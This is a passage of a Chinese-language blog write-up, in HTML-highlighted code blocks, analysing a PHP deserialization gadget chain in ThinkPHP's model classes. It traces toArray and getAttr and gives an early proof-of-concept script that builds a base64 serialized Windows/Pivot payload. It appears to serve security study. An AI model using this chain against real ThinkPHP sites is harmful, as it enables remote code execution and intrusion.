class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">toJson</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>继续跟进<code>toJson()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toJson</span>(<span class="hljs-params"><span class="hljs-variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">toArray</span>(), <span class="hljs-variable">$options</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>继续跟进<code>toArray()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toArray</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$item</span>       = [];<br>        <span class="hljs-variable">$hasVisible</span> = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;visible <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$val</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$val</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$relation</span>, <span class="hljs-variable">$name</span>)      = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$val</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;visible[<span class="hljs-variable">$relation</span>][] = <span class="hljs-variable">$name</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;visible[<span class="hljs-variable">$val</span>] = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$hasVisible</span>          = <span class="hljs-literal">true</span>;<br>                &#125;<br>                <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>]);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;hidden <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$val</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$val</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$relation</span>, <span class="hljs-variable">$name</span>)     = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$val</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$relation</span>][] = <span class="hljs-variable">$name</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$val</span>] = <span class="hljs-literal">true</span>;<br>                &#125;<br>                <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 合并关联数据</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;data, <span class="hljs-variable">$this</span>-&gt;relation);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$val</span> <span class="hljs-keyword">instanceof</span> Model || <span class="hljs-variable">$val</span> <span class="hljs-keyword">instanceof</span> ModelCollection) &#123;<br>                <span class="hljs-comment">// 关联模型对象</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>])) &#123;<br>                    <span class="hljs-variable">$val</span>-&gt;<span class="hljs-title function_ invoke__">visible</span>(<span class="hljs-variable">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>]);<br>                &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>])) &#123;<br>                    <span class="hljs-variable">$val</span>-&gt;<span class="hljs-title function_ invoke__">hidden</span>(<span class="hljs-variable">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]);<br>                &#125;<br>                <span class="hljs-comment">// 关联模型对象</span><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) || <span class="hljs-literal">true</span> !== <span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) &#123;<br>                    <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$val</span>-&gt;<span class="hljs-title function_ invoke__">toArray</span>();<br>                &#125;<br>            &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>])) &#123;<br>                <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>            &#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) &amp;&amp; !<span class="hljs-variable">$hasVisible</span>) &#123;<br>                <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 追加属性（必须定义获取器）</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;append)) &#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;append <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$name</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$name</span>)) &#123;<br>                    <span class="hljs-comment">// 追加关联对象属性</span><br>                    <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelation</span>(<span class="hljs-variable">$key</span>);<br><br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$relation</span>) &#123;<br>                        <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br>                            <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">visible</span>(<span class="hljs-variable">$name</span>);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$relation</span> ? <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$name</span>)-&gt;<span class="hljs-title function_ invoke__">toArray</span>() : [];<br>                &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$attr</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$name</span>);<br>                    <span class="hljs-comment">// 追加关联对象属性</span><br>                    <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelation</span>(<span class="hljs-variable">$key</span>);<br><br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$relation</span>) &#123;<br>                        <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br>                            <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">visible</span>([<span class="hljs-variable">$attr</span>]);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$relation</span> ? <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">append</span>([<span class="hljs-variable">$attr</span>])-&gt;<span class="hljs-title function_ invoke__">toArray</span>() : [];<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable">$item</span>[<span class="hljs-variable">$name</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$item</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$item</span>;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>代码很长，但关键部分只在在中后部分处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;append)) &#123;<br>          <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;append <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$name</span>) &#123;<br>              <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$name</span>)) &#123;<br>                  <span class="hljs-comment">// 追加关联对象属性</span><br>                  <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelation</span>(<span class="hljs-variable">$key</span>);<br><br>                  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$relation</span>) &#123;<br>                      <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>                      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br>                          <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">visible</span>(<span class="hljs-variable">$name</span>);<br>                      &#125;<br>                  &#125;<br><br>                  <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$relation</span> ? <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$name</span>)-&gt;<span class="hljs-title function_ invoke__">toArray</span>() : [];<br>              &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                  <span class="hljs-keyword">list</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$attr</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$name</span>);<br>                  <span class="hljs-comment">// 追加关联对象属性</span><br>                  <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelation</span>(<span class="hljs-variable">$key</span>);<br><br>                  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$relation</span>) &#123;<br>                      <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>                      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br>                          <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">visible</span>([<span class="hljs-variable">$attr</span>]);<br>                      &#125;<br>                  &#125;<br></code></pre></td></tr></table></figure><p>这里面的利用点在于<code>$relation-&gt;visible($name);</code>和<code> $relation-&gt;visible([$attr]);</code>,因为<code>this-&gt;append</code>可控，所以理论上我们可以选择任意一个来作跳板，我这里选择了第二个，即<code> $relation-&gt;visible([$attr]);</code></p><p>如果能进入这条语句，由于<code>this-&gt;append</code>可控，那么<code>$relation</code>也就可控，<code>$relation</code>是由语句<code> $relation = $this-&gt;getAttr($key);</code>而来</p><p>不管其他，先搓个一个简单POC调试调试，想办法进入这条语句<code> $relation-&gt;visible([$attr]);</code>。</p><p>还记得之前提及，这个<code>Conversion</code>是个<code>trail</code>类，需要找一个实现此<code>trait</code>的类，我们选择使用<code>think\model\Pivot</code>类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;files[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Pivot</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">append</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;append = [<span class="hljs-string">&#x27;0.&#x27;</span>]; <span class="hljs-comment">//需要append非空以进入最开始的大if条件，然后需要元素有一个`.`来满足elseif (strpos($name, &#x27;.&#x27;))</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>\<span class="hljs-title class_">Windows</span>;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Windows</span>()));<br>&#125;<br><br><span class="hljs-comment">//TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6MTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6MjoiMC4iO319fX0</span><br></code></pre></td></tr></table></figure><p>此时可以顺利进入块</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$relation</span>) &#123;<br><span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br><span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">visible</span>([<span class="hljs-variable">$attr</span>]);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是会在<code>$relation = $this-&gt;getAttr($key);</code>跟进去查看<code>getAttr()</code>，此时<code>$key=0</code>，即在<code>Pivot-&gt;append</code>设置的元素</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAttr</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, &amp;<span class="hljs-variable">$item</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$notFound</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable">$value</span>    = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getData</span>(<span class="hljs-variable">$name</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">InvalidArgumentException</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable">$notFound</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-variable">$value</span>    = <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 检测属性获取器</span><br>    <span class="hljs-variable">$fieldName</span> = <span class="hljs-title class_">Loader</span>::<span class="hljs-title function_ invoke__">parseName</span>(<span class="hljs-variable">$name</span>);<br>    <span class="hljs-variable">$method</span>    = <span class="hljs-string">&#x27;get&#x27;</span> . <span class="hljs-title class_">Loader</span>::<span class="hljs-title function_ invoke__">parseName</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">1</span>) . <span class="hljs-string">&#x27;Attr&#x27;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>])) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$notFound</span> &amp;&amp; <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isRelationAttr</span>(<span class="hljs-variable">$name</span>)) &#123;<br>            <span class="hljs-variable">$modelRelation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$relation</span>();<br>            <span class="hljs-variable">$value</span>         = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelationData</span>(<span class="hljs-variable">$modelRelation</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$closure</span> = <span class="hljs-variable language_">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>];<br>        <span class="hljs-variable">$value</span>   = <span class="hljs-variable">$closure</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable language_">$this</span>-&gt;data);<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$method</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$notFound</span> &amp;&amp; <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isRelationAttr</span>(<span class="hljs-variable">$name</span>)) &#123;<br>            <span class="hljs-variable">$modelRelation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$relation</span>();<br>            <span class="hljs-variable">$value</span>         = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelationData</span>(<span class="hljs-variable">$modelRelation</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$method</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable language_">$this</span>-&gt;data);<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;type[<span class="hljs-variable">$name</span>])) &#123;<br>        <span class="hljs-comment">// 类型转换</span><br>        <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">readTransform</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$this</span>-&gt;type[<span class="hljs-variable">$name</span>]);<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$name</span>, [<span class="hljs-variable">$this</span>-&gt;createTime, <span class="hljs-variable">$this</span>-&gt;updateTime])) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;autoWriteTimestamp) &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt;autoWriteTimestamp), [<br>            <span class="hljs-string">&#x27;datetime&#x27;</span>,<br>            <span class="hljs-string">&#x27;date&#x27;</span>,<br>            <span class="hljs-string">&#x27;timestamp&#x27;</span>,<br>        ])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">formatDateTime</span>(<span class="hljs-variable">$this</span>-&gt;dateFormat, <span class="hljs-variable">$value</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">formatDateTime</span>(<span class="hljs-variable">$this</span>-&gt;dateFormat, <span class="hljs-variable">$value</span>, <span class="hljs-literal">true</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$notFound</span>) &#123;<br>        <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelationAttribute</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$item</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>代码也很长，但关键只在最前面的<code>try</code>块</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">try</span> &#123;<br>     <span class="hljs-variable">$notFound</span> = <span class="hljs-literal">false</span>;<br>      <span class="hljs-variable">$value</span>    = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getData</span>(<span class="hljs-variable">$name</span>);<br>     &#125; <br><span class="hljs-keyword">catch</span> (<span class="hljs-built_in">InvalidArgumentException</span> <span class="hljs-variable">$e</span>) &#123;<br>       <span class="hljs-variable">$notFound</span> = <span class="hljs-literal">true</span>;<br>       <span class="hljs-variable">$value</span>    = <span class="hljs-literal">null</span>;<br>     &#125;<br></code></pre></td></tr></table></figure><p>跟进<code>getData()</code>，tips：此时的<code>$name=0</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span 